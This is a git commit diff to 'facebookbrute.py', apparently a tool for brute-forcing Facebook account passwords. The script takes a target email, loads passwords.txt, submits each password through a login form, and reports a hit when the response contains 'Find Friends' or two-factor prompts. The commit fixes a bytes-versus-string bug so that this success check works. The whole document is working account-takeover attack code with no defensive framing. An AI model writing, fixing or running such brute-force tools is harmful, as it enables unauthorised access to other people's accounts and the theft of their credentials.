bb86609c1a6ff5db384670ff270951709843261d
spyhack <112711360+vicky3690@users.noreply.github.com>
2023-07-05 23:58:35 +0545

    Update facebookbrute.py

--- facebookbrute.py
+++ facebookbrute.py
@@ -27,7 +27,7 @@ except ImportError:
 print('\n-----v1.1.3-----Welcome To Facebook_Brute-----Coded:Vicky-----\n')
 file = open('passwords.txt', 'r')
 
-email = str(input('Enter Email/Username: ').strip())
+email = input('Enter Email/Username: ').strip()
 
 print("\nTarget Email ID:", email)
 print("\nTrying Passwords from the list...")
@@ -47,7 +47,7 @@ while True:
             browser.form['pass'] = passw
             response = browser.submit()
             response_data = response.read()
-            if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
+            if b'Find Friends' in response_data or b'Two-factor authentication' in response_data or b'security code' in response_data:
                 decoded_response = response_data.decode('utf-8')
                 print('Your password is:', passw)
                 print('Response Data:', decoded_response)
